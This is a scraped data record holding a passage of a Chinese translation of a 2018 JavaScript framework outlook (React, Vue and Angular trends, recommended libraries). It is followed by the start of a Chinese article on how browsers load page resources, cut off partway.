\u003cstrong\u003e之后\u003c/strong\u003e再学习它吧。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eVue.js 在 2017 年表现出色，赢得了很多新闻头条和人们的兴趣。像我所预测的那样，它没有\u003cstrong\u003e赶上 React\u003c/strong\u003e, 同时我也肯定的说在 2018 年也不会发生。\u0008即便如此，它可能在 2018 年超过 Angular:\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160c13ce5ba3b355?w=800\u0026amp;h=329\u0026amp;f=png\u0026amp;s=32243\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003eVue.js 下载量/月\u003c/p\u003e\n\u003cp\u003e如你所见, Vue.js 正在赶上 Angular 的下载量：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160c13ce89a83ff0?w=800\u0026amp;h=328\u0026amp;f=png\u0026amp;s=31243\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003eangular/core 下载量/月\u003c/p\u003e\n\u003cp\u003e但是 React 有很强的领先趋势和与之相同的增长率：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160c13cf5cd2cd33?w=800\u0026amp;h=317\u0026amp;f=png\u0026amp;s=30521\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003eReact 下载量/月\u003c/p\u003e\n\u003cp\u003eVue.js 比 React 增长的更快，那与 2017 年 React 和 Angular 的对比有什么不同\u0008呢？\u003c/p\u003e\n\u003cp\u003e在 2016 年末，JavaScript 世界准备好迎接新的框架了。Angular 的用户非常的不满，React 的用户则与之相反，\u0008许多人想学习 React，很少人愿意学习 Angular。在 2017 年年尾，Angular 2 之后的用户满意度还是不到一半，只有 49%。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eReact 和 Vue.js 则是完全不同的情节\u003c/strong\u003e \u003ca target=\"_blank\" href=\"https://stateofjs.com/2017/front-end/results\"\u003e\u0008React 的用户满意度更高\u003c/a\u003e (93% to 90%)。2017 年早期，从 React 转向 Vue 的最大的刺激是 React 的开源许可证的问题。。Facebook 听取了用户的建议\u0008\u0008后来更改了协议。\u003c/p\u003e\n\u003cp\u003e在这一阶段，我看不到任何迹象可以让\u0008市场从 React 切换到其他的。Vue.js 从 React 手中夺取用户要比从 jQuery 和 Angular 那里难的多。\u003c/p\u003e\n\u003cp\u003e从 Angular 和 jQuery 那里夺取用户有很多空间，但是从 React \u0008那里获取用户来获得持续的增长将会很快碰到瓶颈。\u003c/p\u003e\n\u003cp\u003e我预测 Vue.js 这种快速的增长只会持续一到两年，它会在顶部与 React 进行激烈的竞争，然后会停在第二位，除非有大的改变可以打破这个平衡。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e职位\u003c/h3\u003e\n\u003cblockquote\u003e\n\u003cp\u003ejQuery 凉了。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e在职位列表中, \u0008React 完全取代了 jQuery \u0008之前的位置———**\u003cem\u003e这是十年来第一个超越 jQuery 的库\u003c/em\u003e**¹。我们看到一个时代的终结。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160c13ce4bf0fffe?w=800\u0026amp;h=479\u0026amp;f=png\u0026amp;s=15025\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003eReact 取代了十年来 jQuery 第一的位置\n(来源: Indeed.com)\u003c/p\u003e\n\u003cp\u003e对比一下去年的图:\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160c13ce11faa27d?w=605\u0026amp;h=352\u0026amp;f=png\u0026amp;s=10073\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003ejQuery 2016 年是这样的\u003c/p\u003e\n\u003cp\u003e有趣的点在于其他库的增长值大于 jQuery 滑落的值。总的来说，库相关的职位在去年增长了 10k 或更多。\u003c/p\u003e\n\u003cp\u003e在职位的增加下，我们还看到平均工资的增长 \u003ca target=\"_blank\" href=\"https://www.indeed.com/salaries/Javascript-Developer-Salaries\"\u003e\u003cimg alt=\"110k](https://www.indeed.com/salaries/Javascript-Developer-Salaries) 对比 2016 年的\" class=\"equation\" src=\"https://juejin.im/equation?tex=110k%5D(https%3A%2F%2Fwww.indeed.com%2Fsalaries%2FJavascript-Developer-Salaries)%20%E5%AF%B9%E6%AF%94%202016%20%E5%B9%B4%E7%9A%84%20\"\u003e\u003c/a\u003e 对比 2016 年的 $93k。通货膨胀同期\u0008保持在\u003ca target=\"_blank\" href=\"https://data.bls.gov/timeseries/CUUR0000SA0L1E?output_view=pct_12mths\"\u003e2% 一下\u003c/a\u003e，并不会过多的影响这\u0008一爆炸\u0008式增长。\u003c/p\u003e\n\u003cp\u003e显然，在 2018 还有是卖方市场。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003e1. 方法:\u003c/strong\u003e \u0008职位的\u0008搜索在 Indeed.com 完成。为了增强数据的可靠性，我成\u0008对的搜索 “软件” 相关的关键字扩大相关性，然后乘以大约 1.5 （粗糙的区分那些编程\u0008工作列表使用 “软件” 关键字和不使用的）。所有相关的都按日期排序记录相关性，其结果不一定 100% 准确，但是已经足够用来在此文中表示粗略的度。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch3 class=\"heading\"\u003e框架推荐\u003c/h3\u003e\n\u003cp\u003e在看了今年的数据之后，我强烈用最广泛使用的 React 来开发应用，包括移动端应用（PWAs, React Native），web 应用，大部分的生产力工具，以及桌面媒体应用（\u003ca target=\"_blank\" href=\"https://electronjs.org/\"\u003eElectron\u003c/a\u003e）。\u003c/p\u003e\n\u003cp\u003e某些明显的情况下，其他的可能更为适用好：轻量的营销页面（完全不需要框架），3D 游戏，AR/VR。对于 3D 的内容，看看 \u003ca target=\"_blank\" href=\"https://unity3d.com/\"\u003eUnity\u003c/a\u003e, \u003ca target=\"_blank\" href=\"https://www.unrealengine.com/en-US/what-is-unreal-engine-4\"\u003eUnreal\u003c/a\u003e, 或者 \u003ca target=\"_blank\" href=\"https://playcanvas.com/\"\u003ePlayCanvas\u003c/a\u003e。即便如此，React 也可以作为 3D 内容的 UI 库。\u003c/p\u003e\n\u003cp\u003e我强烈不建议转向其他可以备选的前端框架。这并不是说它们不好，只是它们不是市场上 React 有力的竞争者。记住，这个列表是关于投资回报率，而不是哪一个技术是最棒的。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e为什么对 React 这么感兴趣?\u003c/h3\u003e\n\u003cp\u003e浏览 React 的职位列表，我注意到很多本不应该属于前端工作的有趣的趋势：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eReact Native (看起来, 这些需求\u0008总量比 Vue.js 的还多)\u003c/li\u003e\n\u003cli\u003eReact IoT\u003c/li\u003e\n\u003cli\u003eReact AR/VR (Oculus Rift\u0008 主导需求市场)\u003c/li\u003e\n\u003cli\u003eReact 对那些你从来\u0008没听说\u0008的模糊计算\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003eReact 已经脱离了它 web 的土壤\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e灵活性是 \u0008React 最大的卖点。不像其他框架，采用 React 并不意味着关注它的数据模型，甚至浏览器和 DOM。事实上，我发现不少 React 的工作需求完全没有提到 JavaScript。\u003c/p\u003e\n\u003cp\u003e\u0008React 提供了基于其标准的丰富的充满活力的生态系统，这些从 jQuery 统治 web 以来从来没有看到过。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e问题不再是“哪一个框架？”\n问题是 “什么技术可以更好的搭配 React?”\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u0008没有任何事物可以在 2018 改变 React（也许\u0008 2019 也是）。你很安全。JavaScript 疲劳渐渐稳定了。我们有了一个伟大的构造应用的框架，同时有着相关的优秀的生态系统。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e你应该学习哪些话题?\u003c/h3\u003e\n\u003cp\u003e像去年一样，你不能错误的关注一些要点，但是\u0008你应该更\u0008加重视\u0008 React 应用的函数式编程。\u003c/p\u003e\n\u003cp\u003eReact 有\u0008两点优秀之处:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e确定性的视图渲染\u003c/li\u003e\n\u003cli\u003e将视图层从 DOM \u0008操作中抽象出来\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e确定性通过使用纯函数构建应用来实现，这本质上也是函数式编程的定义。\u003c/p\u003e\n\u003cp\u003e考虑这一点, 这是一些你需要学习的内容:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://medium.com/javascript-scene/a-functional-programmers-introduction-to-javascript-composing-software-d670d14ede30\"\u003e\u003cstrong\u003e基础的 ES6 语法\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://medium.com/javascript-scene/why-composition-is-harder-with-classes-c3e627dcd0aa\"\u003e\u003cstrong\u003e类的语法和它的各种陷阱\u003c/strong\u003e\u003c/a\u003e — 可以对 React 组件使用类，但是应该避免继承你自己的类，避免 \u003ccode\u003einstanceof\u003c/code\u003e, 避免类的使用者使用 \u003ccode\u003enew\u003c/code\u003e关键字。\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://medium.com/javascript-scene/composing-software-an-introduction-27b72500d6ea\"\u003e\u003cstrong\u003e函数式编程 和 软件组成\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://medium.com/javascript-scene/a-functional-programmers-introduction-to-javascript-composing-software-d670d14ede30#0355\"\u003e\u003cstrong\u003eCurrying\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://medium.com/javascript-scene/master-the-javascript-interview-what-is-a-closure-b2f0d2152b36\"\u003e\u003cstrong\u003e闭包\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://medium.com/javascript-scene/master-the-javascript-interview-what-is-a-pure-function-d1c076bec976\"\u003e\u003cstrong\u003e纯函数\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://medium.com/javascript-scene/master-the-javascript-interview-what-is-a-promise-27fc71e77261\"\u003e\u003cstrong\u003ePromises\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://medium.com/javascript-scene/7-surprising-things-i-learned-writing-a-fibonacci-generator-4886a5c87710\"\u003e\u003cstrong\u003eGenerators\u003c/strong\u003e\u003c/a\u003e \u003cstrong\u003e和\u003c/strong\u003e \u003ca target=\"_blank\" href=\"https://medium.com/javascript-scene/the-hidden-power-of-es6-generators-observable-async-flow-control-cfa4c7f31435\"\u003e\u003cstrong\u003e异步函数\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://medium.com/javascript-scene/the-outrageous-cost-of-skipping-tdd-code-reviews-57887064c412\"\u003e\u003cstrong\u003eTDD\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://www.smashingmagazine.com/2015/10/rail-user-centric-model-performance/\"\u003e\u003cstrong\u003eRAIL 性能模型\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProgressive Web Applications (PWAs):\u003c/strong\u003e \u0008\u0008看一下 \u003ca target=\"_blank\" href=\"https://medium.com/javascript-scene/native-apps-are-doomed-ac397148a2c0\"\u003e“Native Apps are Doomed”\u003c/a\u003e 和 \u003ca target=\"_blank\" href=\"https://medium.com/javascript-scene/why-native-apps-really-are-doomed-native-apps-are-doomed-pt-2-e035b43170e9\"\u003e“Why Native Apps Really Are Doomed”\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eGraphQL\u003c/strong\u003e 在 2017 年成熟了很多，非常快速的取代 REST API, Apollo 采用了内置的离线客户端缓存架构让 Apollo 和 GraphQL 成为 2018 Redux 的一个真正的备选方案（或补充）。\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 class=\"heading\"\u003e库和工具\u003c/h3\u003e\n\u003cp\u003e这里是一些我发现的最有用的库和工具：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://reactjs.org/\"\u003e\u003cstrong\u003eReact\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://redux.js.org/\"\u003e\u003cstrong\u003eRedux\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://github.com/redux-saga/redux-saga\"\u003e\u003cstrong\u003eRedux-Saga\u003c/strong\u003e\u003c/a\u003e 管理异步 IO 分离副作用\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://github.com/zeit/next.js/\"\u003e\u003cstrong\u003eNext.js\u003c/strong\u003e\u003c/a\u003e — Node 和 Express 的服务端喧嚷, 自动的\u0008\u0008分离打包, styled-jsx\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"http://www.material-ui.com/\"\u003e\u003cstrong\u003eMaterial UI\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://github.com/storybooks/storybook\"\u003e\u003cstrong\u003eStorybook\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://github.com/cheeriojs/cheerio\"\u003e\u003cstrong\u003eCheerio\u003c/strong\u003e\u003c/a\u003e 用来做 React 组件的单元测试（相比 Enzyme 我更喜欢它）\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://lodash.com/\"\u003e\u003cstrong\u003eLodash\u003c/strong\u003e\u003c/a\u003e (我更倾向于 \u003ccode\u003elodash/fp\u003c/code\u003e)。只导入需要的包避免增大打包体积。\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://babeljs.io/\"\u003e\u003cstrong\u003eBabel\u003c/strong\u003e\u003c/a\u003e\u003cstrong\u003e:\u003c/strong\u003e 编译 ES6 使它在更老的浏览器上运行\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://webpack.github.io/\"\u003e\u003cstrong\u003eWebpack\u003c/strong\u003e\u003c/a\u003e\u003cstrong\u003e:\u003c/strong\u003e 最流行 JavaScript 打包工具，向 \u003ca target=\"_blank\" href=\"https://github.com/kriasoft/react-starter-kit\"\u003ekit/boilerplate\u003c/a\u003e找一些简单的样例来快速的开始。\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"http://eslint.org/\"\u003e\u003cstrong\u003eESLint:\u003c/strong\u003e\u003c/a\u003e 提早检测语法错误和样式问题，在 code review 和测试驱动开发之外最好的可以减少你代码里错误的工具。\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"http://ramdajs.com/\"\u003e\u003cstrong\u003eRamda\u003c/strong\u003e\u003c/a\u003e— 主要是为了 lenses 和 transducers.\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://medium.com/javascript-scene/introduction-to-node-express-90c431f9e6fd#.gl2r6gcnn\"\u003e\u003cstrong\u003eNode \u0026amp; Express\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"http://reactivex.io/rxjs/\"\u003e\u003cstrong\u003eRxJS\u003c/strong\u003e\u003c/a\u003e\u003cstrong\u003e:\u003c/strong\u003e 让 JavaScript 可观察，最近我一直在使用 transducers，记着使用 \u003ca target=\"_blank\" href=\"https://github.com/ReactiveX/rxjs#es6-via-npm\"\u003epatch imports\u003c/a\u003e 来减小包体积。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eTypeScript\u003c/strong\u003e2017 年表现不错, 但我认为它增加应用的复杂度的弊端大于它的帮助，它的主要缺点是过分依赖注释而不是接口，同时对高阶函数\u0008\u0008的类型有无法形容的扭曲，我做了一整天的试用，这些情况仍然存在\u0008：\u003ca target=\"_blank\" href=\"https://medium.com/javascript-scene/the-shocking-secret-about-static-types-514d39bf30a3\"\u003e“静态类型之秘”\u003c/a\u003e 和 \u003ca target=\"_blank\" href=\"https://medium.com/javascript-scene/you-might-not-need-typescript-or-static-types-aa7cb670a77b\"\u003e“你也许不需要 JavaScript”\u003c/a\u003e。Flow 跟 TypeScript 有相同的问题\u0008同时开发者工具也不如 \u0008TypeScript 的棒。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e2018 技术展望\u003c/h3\u003e\n\u003cp\u003e所有的这些都是 2018 研究与开发领域真实的工作：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eProgressive Web Apps (PWAs)\u003c/li\u003e\n\u003cli\u003e区块链与金融\u0008\u0008科技\u003c/li\u003e\n\u003cli\u003e\u0008医疗科技\u003c/li\u003e\n\u003cli\u003eAR/VR — Hololens, Meta, 和 ODG 现在\u0008可以出货了。 ODG R-9 本来预计 2017 发售但是很有可能放在 2018。MagicLeap 承诺 2018 发布。AR 将会比过去手机更加改变人们的体验。\u003c/li\u003e\n\u003cli\u003e3D 打印\u003c/li\u003e\n\u003cli\u003eAI\u003c/li\u003e\n\u003cli\u003e无人驾驶\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e量子计算也将改变世界，但是也许在 2019 或者更晚改变才会开始。目前有在网上工作的量子计算机，但是他们还做的不是很多。现在对于大多数开发者来说开始试验性生产还太早。微软最近发布了它的量子计算编程语言 \u003ca target=\"_blank\" href=\"https://arstechnica.com/gadgets/2017/12/microsofts-q-quantum-programming-language-out-now-in-preview/\"\u003eQ#\u003c/a\u003e，\u003ca target=\"_blank\" href=\"https://www.forbes.com/sites/alexkonrad/2017/12/14/why-companies-like-jpmorgan-chase-and-samsung-are-partnering-with-ibm-in-quantum-computing/#123ce0592c4d\"\u003eIBM\u003c/a\u003e 和 \u003ca target=\"_blank\" href=\"https://www.inverse.com/article/38917-google-quantum-simulator-creates-a-butterfly\"\u003eGoogle\u003c/a\u003e 也继续大量投资自己的\u0008量子云计算市场。\u003c/p\u003e\n\u003cp\u003e如果你想学习量子计算，你也许需要学习 \u003ca target=\"_blank\" href=\"https://mitpress.mit.edu/books/quantum-algorithms-linear-algebra\"\u003e线性代数\u003c/a\u003e，同时也有\u0008对于量子计算也有一些基于 \u003ca target=\"_blank\" href=\"https://plato.stanford.edu/entries/lambda-calculus/\"\u003elambda 演算\u003c/a\u003e 的函数式\u0008探索。\u003c/p\u003e\n\u003cp\u003e很有可能，像我们看到的 AI, 云 API 将会被开发出来让\u0008有不同数学背景的人来更好的利用好量子计算的能力。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e需要为你的团队教授 React?\u003c/h3\u003e\n\u003cp\u003eDevAnywhere 提供一些 React 的线上教程，和一对一的关于 React 中函数式编程及软件构建原理的指导。\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://devanywhere.io/\"\u003e\u003c/a\u003e\u003c/p\u003e\u003cfigure\u003e\u003ca target=\"_blank\" href=\"https://devanywhere.io/\"\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/10/160409bd95f267df?w=800\u0026amp;h=450\u0026amp;f=png\u0026amp;s=366761\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/a\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://devanywhere.io/\"\u003ehttps://devanywhere.io/\u003c/a\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003cp\u003e\u003cstrong\u003e\u003cem\u003eEric Elliott\u003c/em\u003e\u003c/strong\u003e \u003cem\u003eis the author of\u003c/em\u003e \u003ca target=\"_blank\" href=\"http://pjabook.com\"\u003e\u003cem\u003e“Programming JavaScript Applications”\u003c/em\u003e\u003c/a\u003e \u003cem\u003e(O’Reilly), and cofounder of\u003c/em\u003e \u003ca target=\"_blank\" href=\"https://devanywhere.io/\"\u003e\u003cem\u003eDevAnywhere.io\u003c/em\u003e\u003c/a\u003e\u003cem\u003e. He has contributed to software experiences for\u003c/em\u003e \u003cstrong\u003e\u003cem\u003eAdobe Systems\u003c/em\u003e\u003c/strong\u003e\u003cem\u003e,\u003c/em\u003e \u003cstrong\u003e\u003cem\u003eZumba Fitness\u003c/em\u003e\u003c/strong\u003e\u003cem\u003e,\u003c/em\u003e \u003cstrong\u003e\u003cem\u003eThe Wall Street Journal\u003c/em\u003e\u003c/strong\u003e\u003cem\u003e,\u003c/em\u003e \u003cstrong\u003e\u003cem\u003eESPN\u003c/em\u003e\u003c/strong\u003e\u003cem\u003e,\u003c/em\u003e \u003cstrong\u003e\u003cem\u003eBBC\u003c/em\u003e\u003c/strong\u003e\u003cem\u003e, and top recording artists including\u003c/em\u003e \u003cstrong\u003e\u003cem\u003eUsher\u003c/em\u003e\u003c/strong\u003e\u003cem\u003e,\u003c/em\u003e \u003cstrong\u003e\u003cem\u003eFrank Ocean\u003c/em\u003e\u003c/strong\u003e\u003cem\u003e,\u003c/em\u003e \u003cstrong\u003e\u003cem\u003eMetallica\u003c/em\u003e\u003c/strong\u003e\u003cem\u003e, and many more.\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003cem\u003eHe works anywhere he wants with the most beautiful woman in the world.\u003c/em\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner\"\u003e掘金翻译计划\u003c/a\u003e 是一个翻译优质互联网技术文章的社区，文章来源为 \u003ca target=\"_blank\" href=\"https://juejin.im\"\u003e掘金\u003c/a\u003e 上的英文分享文章。内容覆盖 \u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner#android\"\u003eAndroid\u003c/a\u003e、\u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner#ios\"\u003eiOS\u003c/a\u003e、\u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner#%E5%89%8D%E7%AB%AF\"\u003e前端\u003c/a\u003e、\u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner#%E5%90%8E%E7%AB%AF\"\u003e后端\u003c/a\u003e、\u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner#%E5%8C%BA%E5%9D%97%E9%93%BE\"\u003e区块链\u003c/a\u003e、\u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner#%E4%BA%A7%E5%93%81\"\u003e产品\u003c/a\u003e、\u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner#%E8%AE%BE%E8%AE%A1\"\u003e设计\u003c/a\u003e、\u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner#%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD\"\u003e人工智能\u003c/a\u003e等领域，想要查看更多优质译文请持续关注 \u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner\"\u003e掘金翻译计划\u003c/a\u003e、\u003ca target=\"_blank\" href=\"http://weibo.com/juejinfanyi\"\u003e官方微博\u003c/a\u003e、\u003ca target=\"_blank\" href=\"https://zhuanlan.zhihu.com/juejinfanyi\"\u003e知乎专栏\u003c/a\u003e。\u003c/p\u003e\n\u003c/blockquote\u003e\n","buildTime":"1515151182.4413","__v":0}
{"_id":{"$oid":"5a4f5f6218646e1ee8be9902"},"id":"5a4ed917f265da3e317df515","author":{"$oid":"5a4b770f19da8721f49c06f5"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"浏览器页面资源加载过程与优化","meta":{"likeCount":0},"tag":["浏览器","JavaScript","安全","前端"],"comment":[],"shortContent":"当浏览器截获到一个页面请求后，将会按照顺序做如下图所示的4件事。 首先会将所有需要加载的资源进行分类。 然后根据浏览器相关的安全策略，来决定资源的加载权限。 接着对各个资源的加载优先级进行计算和排序。 最后一步，根据加载优先级顺序来加载资源。 chrome浏览器会将资源分为14…","content":"\u003cblockquote\u003e\n\u003cp\u003e评价页面性能好坏的核心之一就是\u003cstrong\u003e页面的加载速度\u003c/strong\u003e，而\u003cstrong\u003e页面加载速度\u003c/strong\u003e的关键就是\u003cstrong\u003e页面资源的加载\u003c/strong\u003e。本文将从浏览器浏览器页面资源加载过程展开分析，来引出页面\u003cstrong\u003e关键请求路径\u003c/strong\u003e的概念，并给出如何优化该\u003cstrong\u003e关键请求路径\u003c/strong\u003e的一些方法。\n下面相关内容，都是以chrome浏览器为例来进行介绍的。不同浏览器之间，可以会略有差异，但基本过程是一致的。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch3 class=\"heading\"\u003e浏览器加载资源过程\u003c/h3\u003e\n\u003cp\u003e首先抛出两个问题：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e浏览器如何知道应该加载哪些资源？\u003c/li\u003e\n\u003cli\u003e浏览器是什么顺序来加载这些资源？\n当浏览器截获到一个页面请求后，将会按照顺序做如下图所示的4件事。\n\u003cfigure\u003e\u003cimg alt=\"流程\" src=\"https://user-gold-cdn.xitu.io/2018/1/5/160c4005678a8cb8?w=1066\u0026amp;h=170\u0026amp;f=jpeg\u0026amp;s=93986\"\u003e\u003cfigcaption\u003e流程\u003c/figcaption\u003e\u003c/figure\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003col\u003e\n\u003cli\u003e首先会将所有需要加载的资源进行分类。\u003c/li\u003e\n\u003cli\u003e然后根据浏览器相关的安全策略，来决定资源的加载权限。\u003c/li\u003e\n\u003cli\u003e接着对各个资源的加载优先级进行计算和排序。\u003c/li\u003e\n\u003cli\u003e最后一步，根据加载优先级顺序来加载资源。\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch5 class=\"heading\"\u003e第一步：资源分类\u003c/h5\u003e\n\u003cp\u003echrome浏览器会将资源分为14类，如下表所示。\u003c/p\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003e类型\u003c/th\u003e\n\u003cth\u003e介绍\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003ekMainResource\u003c/td\u003e\n\u003ctd\u003e即主资源，html页面文件资源就属于该类型\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003ekImage\u003c/td\u003e\n\u003ctd\u003e各种图片资源\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003ekCSSStyleSheet\u003c/td\u003e\n\u003ctd\u003e顾名思义，就是层叠样式表css资源\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003ekScript\u003c/td\u003e\n\u003ctd\u003e脚本资源，例如js资源\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003ekFont\u003c/td\u003e\n\u003ctd\u003e字体资源，例如网页中常用的字体集.woff资源\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003ekRaw\u003c/td\u003e\n\u003ctd\u003e混合类型资源，最常见的ajax请求就属于这类资源\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003ekSVGDocument\u003c/td\u003e\n\u003ctd\u003eSVG可缩放矢量图形文件资源\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003ekXSLStyleSheet\u003c/td\u003e\n\u003ctd\u003e扩展样式表语言XSLT，是一种转换语言，关于该类型可以查阅w3c XSL来了解\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003ekLinkPrefetch\u003c/td\u003e\n\u003ctd\u003eHTML5页面的预读取资源(Link prefetch)，例如dns-prefetch。下面会有详细介绍\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003ekTextTrack\u003c/td\u003e\n\u003ctd\u003evideo的字幕资源，- 即\u003ccode\u003e\u0026lt;track\u0026gt;\u003c/code\u003e标签\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003ekImportResource\u003c/td\u003e\n\u003ctd\u003eHTML Imports，将一个HTML文件导入到其他HTML文档中，例如\u003ccode\u003e\u0026lt;link href=\"import/post.html\" rel=\"import\" /\u0026gt;\u003c/code\u003e。详细了解请查阅相关文档。\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003ekMedia\u003c/td\u003e\n\u003ctd\u003e多媒体资源，video or 